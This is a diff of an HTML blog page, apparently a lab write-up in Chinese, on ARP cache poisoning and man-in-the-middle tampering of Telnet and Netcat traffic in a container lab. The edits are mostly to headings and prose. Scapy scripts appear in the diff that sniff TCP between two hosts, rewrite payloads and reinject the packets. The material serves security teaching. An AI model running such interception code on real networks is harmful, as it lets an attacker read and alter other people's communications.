@@ -278,16 +278,16 @@ unicode: "f6d2"
         <li><a href="#实验环境">实验环境</a></li>
       </ol>
     </li>
-    <li><a href="#任务一arp-缓存投毒">任务一：ARP 缓存投毒</a>
+    <li><a href="#arp-缓存投毒">ARP 缓存投毒</a>
       <ol>
-        <li><a href="#task-1aarp-request-进行缓存投毒">Task 1.A：ARP Request 进行缓存投毒</a></li>
-        <li><a href="#task-1barp-reply-投毒">Task 1.B：ARP Reply 投毒</a>
+        <li><a href="#arp-request-进行缓存投毒">ARP Request 进行缓存投毒</a></li>
+        <li><a href="#arp-reply-投毒">ARP Reply 投毒</a>
           <ol>
             <li><a href="#缓存中不存在ip">缓存中不存在IP</a></li>
             <li><a href="#缓存中存在ip">缓存中存在IP</a></li>
           </ol>
         </li>
-        <li><a href="#task-1carp-无端报文">Task 1.C：<strong>ARP</strong> <strong>无端报文</strong></a>
+        <li><a href="#arp无端报文">ARP无端报文</a>
           <ol>
             <li><a href="#缓存中不存在ip-1">缓存中不存在IP</a></li>
             <li><a href="#缓存中存在ip-1">缓存中存在IP</a></li>
@@ -295,14 +295,14 @@ unicode: "f6d2"
         </li>
       </ol>
     </li>
-    <li><a href="#任务二telnet-中间人攻击">任务二：Telnet 中间人攻击</a>
+    <li><a href="#telnet-中间人攻击">Telnet 中间人攻击</a>
       <ol>
         <li><a href="#双向投毒">双向投毒</a></li>
         <li><a href="#ip-转发">IP 转发</a></li>
         <li><a href="#数据篡改">数据篡改</a></li>
       </ol>
     </li>
-    <li><a href="#任务三netcat-中间人攻击">任务三：Netcat 中间人攻击</a></li>
+    <li><a href="#netcat-中间人攻击">Netcat 中间人攻击</a></li>
     <li><a href="#结论">结论</a></li>
     <li><a href="#参考">参考</a></li>
   </ol>
@@ -572,10 +572,10 @@ unicode: "f6d2"
 <li>Attacker：10.9.0.105</li>
 </ul>
 <img src="3.png" style="width: 100%;" />
-<h2 id="任务一arp-缓存投毒">任务一：ARP 缓存投毒
-</h2><p>ARP 协议用于建立 IP 地址到 MAC 地址的映射关系，但这个协议是无状态的，且不具备认证机制。主机在接收到 ARP 报文后，会直接根据其中的 IP-MAC 映射更新本地缓存，而不会验证真实性。
-这意味着攻击者可以通过构造伪造的 ARP 报文，欺骗受害主机修改缓存，从而影响数据的实际转发路径。</p>
-<h3 id="task-1aarp-request-进行缓存投毒">Task 1.A：ARP Request 进行缓存投毒
+<h2 id="arp-缓存投毒">ARP 缓存投毒
+</h2><p>ARP 协议用于建立 IP 地址到 MAC 地址的映射关系，但这个协议是无状态的，而且没有认证机制。主机在接收到 ARP 报文后，会直接根据其中的 IP-MAC 映射更新本地缓存，不会验证真实性</p>
+<p>这意味着攻击者可以通过构造伪造的 ARP 报文，欺骗受害主机修改缓存，从而影响数据的实际转发路径</p>
+<h3 id="arp-request-进行缓存投毒">ARP Request 进行缓存投毒
 </h3><blockquote>
 <p>实验目标：使 Host A 错误地将伪造 IP (10.9.0.99) 映射到攻击者指定的 MAC 地址</p>
 <p>方法：构造 ARP Request，广播伪造数据包</p>
@@ -668,7 +668,7 @@ unicode: "f6d2"
 <blockquote>
 <p>结论：ARP Request 可直接生成伪造缓存，ARP 缓存更新并不严格依赖于请求响应关系，只要报文格式合法，就可能被信任并写入缓存。当 Host A 向该 IP 发起通信时，会把数据发到攻击者的 MAC</p>
 </blockquote>
-<h3 id="task-1barp-reply-投毒">Task 1.B：ARP Reply 投毒
+<h3 id="arp-reply-投毒">ARP Reply 投毒
 </h3><blockquote>
 <p>实验目标：验证未经请求的 ARP Reply 报文能否篡改受害者的 ARP 缓存</p>
 <p>方法：构造 ARP Reply，广播伪造数据包，分别针对 Host A 缓存中存在和不存在的 IP 进行测试</p>
@@ -779,7 +779,7 @@ unicode: "f6d2"
 <blockquote>
 <p>结论：Linux 在处理 ARP Reply 时通常不会为未请求的 IP 创建新的缓存项，但允许更新已有条目</p>
 </blockquote>
-<h3 id="task-1carp-无端报文">Task 1.C：<strong>ARP</strong> <strong>无端报文</strong>
+<h3 id="arp无端报文">ARP无端报文
 </h3><blockquote>
 <p>实验目标：测试源 IP 和目的 IP 相同的特殊广播 ARP 报文的投毒效果</p>
 <p>方法：在攻击者 M 中发送无端 ARP 广播包，分别针对 Host A 缓存中存在和不存在的 IP 进行测试</p>
@@ -890,16 +890,12 @@ unicode: "f6d2"
 </div><p>在容器 A 查看 ARP 缓存， MAC 被篡改</p>
 <img src="9.png" style="width: 100%;" />
 <blockquote>
-<p>结论：与 Task 1.B 完全一致。无端 ARP 只能更新受害者缓存中已有的记录，无法凭空捏造新记录</p>
+<p>结论：与上一个实验完全一致。无端 ARP 只能更新受害者缓存中已有的记录，无法凭空捏造新记录</p>
 </blockquote>
-<h2 id="任务二telnet-中间人攻击">任务二：Telnet 中间人攻击
+<h2 id="telnet-中间人攻击">Telnet 中间人攻击
 </h2><h3 id="双向投毒">双向投毒
 </h3><blockquote>
-<p>要实现中间人攻击，仅欺骗单一主机是不够的。攻击者必须同时欺骗通信双方，持续发送 ARP 伪造包，使：</p>
-<ul>
-<li>A 认为 B 的 MAC 是攻击者</li>
-<li>B 认为 A 的 MAC 是攻击者</li>
-</ul>
+<p>要实现中间人攻击，欺骗单一主机是不够的。攻击者必须同时欺骗通信双方，持续发送 ARP 伪造包，使   A 认为 B 的 MAC 是攻击者，B 认为 A 的 MAC 是攻击者</p>
 <p>这样双方的二层转发路径被劫持，所有流量都会先到达攻击者，再由攻击者转发</p>
 </blockquote>
 <p>在容器M构造投毒脚本</p>
@@ -1091,7 +1087,7 @@ unicode: "f6d2"
 </span></span><span class="line"><span class="cl"><span class="n">sniff</span><span class="p">(</span><span class="nb">filter</span><span class="o">=</span><span class="s2">&#34;tcp&#34;</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">process</span><span class="p">,</span> <span class="n">store</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>问题在于直接修改捕获到的原始数据包并重新发送，这种做法没有区分原始流量和自己注入的流量，很容易导致同一个包被反复抓取和处理，同时破坏了 TCP 连接的正常状态，进而触发大量重传，表现为卡顿甚至无响应。解决方法是获取攻击者网卡 MAC 地址并在处理前加一行 if 判断跳过自身发出的包</p>
+</div><p>问题在于直接修改捕获到的原始数据包并重新发送，没有区分原始流量和自己注入的流量，很容易导致同一个包被反复抓取处理，还破坏了 TCP 连接的正常状态，导致了无响应。解决方法是获取攻击者网卡 MAC 地址并在处理前加一行 if 判断跳过自身发出的包</p>
 </blockquote>
 <blockquote>
 <details>
@@ -1138,38 +1134,34 @@ unicode: "f6d2"
 </span></span><span class="line"><span class="cl"><span class="n">IP_B</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.6&#34;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">spoof_pkt</span><span class="p">(</span><span class="n">pkt</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="c1"># A -&gt; B</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">IP_A</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span> <span class="o">==</span> <span class="n">IP_B</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="n">old_data</span> <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">load</span>
-</span></span><span class="line"><span class="cl">            <span class="n">new_data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">rb</span><span class="s1">&#39;[a-zA-Z]&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="n">old_data</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            
-</span></span><span class="line"><span class="cl">            <span class="c1"># 构造新包并清除校验和让 Scapy 重新计算</span>
-</span></span><span class="line"><span class="cl">            <span class="n">newpkt</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]))</span>
-</span></span><span class="line"><span class="cl">            <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            <span class="n">newpkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="n">Raw</span><span class="p">(</span><span class="n">load</span><span class="o">=</span><span class="n">new_data</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            <span class="n">send</span><span class="p">(</span><span class="n">newpkt</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl">    <span class="c1"># B -&gt; A</span>
-</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">IP_B</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span> <span class="o">==</span> <span class="n">IP_A</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">newpkt</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]))</span>
-</span></span><span class="line"><span class="cl">        <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">send</span><span class="p">(</span><span class="n">newpkt</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"> <span class="c1"># A -&gt; B</span>
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">IP_A</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span> <span class="o">==</span> <span class="n">IP_B</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">     <span class="k">if</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">         <span class="n">old_data</span> <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">load</span>
+</span></span><span class="line"><span class="cl">         <span class="n">new_data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">rb</span><span class="s1">&#39;[a-zA-Z]&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="n">old_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">         <span class="c1"># 构造新包并清除校验和让 Scapy 重新计算</span>
+</span></span><span class="line"><span class="cl">         <span class="n">newpkt</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">         <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">         <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">         <span class="n">newpkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="n">Raw</span><span class="p">(</span><span class="n">load</span><span class="o">=</span><span class="n">new_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">         <span class="n">send</span><span class="p">(</span><span class="n">newpkt</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="c1"># B -&gt; A</span>
+</span></span><span class="line"><span class="cl"> <span class="k">elif</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">IP_B</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span> <span class="o">==</span> <span class="n">IP_A</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">     <span class="n">newpkt</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">     <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">     <span class="n">send</span><span class="p">(</span><span class="n">newpkt</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;tcp and (host </span><span class="si">{</span><span class="n">IP_A</span><span class="si">}</span><span class="s1"> and host </span><span class="si">{</span><span class="n">IP_B</span><span class="si">}</span><span class="s1">)&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="n">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="s1">&#39;eth0&#39;</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="n">f</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">spoof_pkt</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>虽然改成了重新构造数据包并做字符替换，结构上更规范，但仍然没有解决 TCP 流量一致性问题。修改 payload 后如果不正确处理序列号和确认号，同时又在 sniff 和 send 之间形成回灌，就会让通信双方的 TCP 状态不断偏移，最终进入持续重传的状态，连接变得不稳定甚至卡死</p>
-<p>通过设置 store=0 减少 sniff 过程中的内存占用，结合 MAC 或流量方向过滤避免自身注入包被再次捕获造成回环处理，同时在 payload 修改时保持等长替换以降低 TCP 序列偏移带来的异常影响，从而显著缓解 Scapy 中间人脚本引起的卡顿与连接不稳定问题。</p>
+</div><p>后来发现问题不只是字符替换本身。虽然已经改成重新构造数据包再替换 payload，但 TCP 连接还是会卡顿甚至疯狂重传。原因是修改 payload 后，TCP 的序列号和确认号会受到影响。如果数据长度变化，但没有同步处理 seq 和 ack，通信双方就会认为对方的数据不对，开始不断重传。另外发包后如果没有过滤自身发出的数据包，脚本还会把自己注入的包再次抓回来，形成循环导致卡死</p>
+<p>把 sniff 的 <code>store=0</code> 打开减少缓存占用，再通过 MAC 地址和流量方向过滤掉自己注入的数据包，同时尽量使用等长替换，连接稳定了很多</p>
 </blockquote>
-<blockquote>
-<p>TCP 是面向连接的可靠传输协议，依赖序列号与确认号维持状态一致性。
-如果中间人随意修改数据而不保证长度或序列一致，就会破坏连接状态，导致重传甚至连接中断</p>
-</blockquote>
-<p>最终代码如下：</p>
+<p>TCP 连接会校验序列号与确认号，中间人修改数据必须保证长度和序列号不变才能保持连接。最终代码如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1209,6 +1201,7 @@ unicode: "f6d2"
 </span><span class="lnt">35
 </span><span class="lnt">36
 </span><span class="lnt">37
+</span><span class="lnt">38
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
@@ -1225,7 +1218,7 @@ unicode: "f6d2"
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pkt</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">MY_MAC</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># A -&gt; B </span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># A发给B </span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">IP_A</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span> <span class="o">==</span> <span class="n">IP_B</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="n">newpkt</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]))</span>
 </span></span><span class="line"><span class="cl">        <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
@@ -1235,9 +1228,10 @@ unicode: "f6d2"
 </span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">load</span>
 </span></span><span class="line"><span class="cl">            <span class="n">newdata</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">rb</span><span class="s1">&#39;[a-zA-Z0-9]&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">            <span class="n">newpkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="n">Raw</span><span class="p">(</span><span class="n">load</span><span class="o">=</span><span class="n">newdata</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            
 </span></span><span class="line"><span class="cl">        <span class="n">send</span><span class="p">(</span><span class="n">newpkt</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1"># B -&gt; A </span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># B发给A </span>
 </span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">IP_B</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span> <span class="o">==</span> <span class="n">IP_A</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="n">newpkt</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]))</span>
 </span></span><span class="line"><span class="cl">        <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
@@ -1246,7 +1240,7 @@ unicode: "f6d2"
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;tcp and (host </span><span class="si">{</span><span class="n">IP_A</span><span class="si">}</span><span class="s1"> and host </span><span class="si">{</span><span class="n">IP_B</span><span class="si">}</span><span class="s1">)&#39;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># store=0 杜绝内存卡死</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># store=0 防止内存卡死</span>
 </span></span><span class="line"><span class="cl"><span class="n">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="s1">&#39;eth0&#39;</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="n">f</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">spoof_pkt</span><span class="p">,</span> <span class="n">store</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
@@ -1274,7 +1268,7 @@ unicode: "f6d2"
 </div>
 </div><p>在登陆这里输入任何字符都会变成 A，说明数据在传输过程中被修改</p>
 <img src="16.png" style="width: 60%;" />
-<h2 id="任务三netcat-中间人攻击">任务三：Netcat 中间人攻击
+<h2 id="netcat-中间人攻击">Netcat 中间人攻击
 </h2><blockquote>
 <p>实验目标：在不中断 TCP 连接的前提下，精准拦截 Netcat 通信并篡改信息内容</p>
 </blockquote>
@@ -1714,7 +1708,7 @@ unicode: "f6d2"
       共发表文章 
       <span class="number-highlight">25</span> 
       篇 ，总计 
-      <span class="number-highlight">94.86</span> 
+      <span class="number-highlight">93.02</span> 
       k 字
   </div>
   <div>
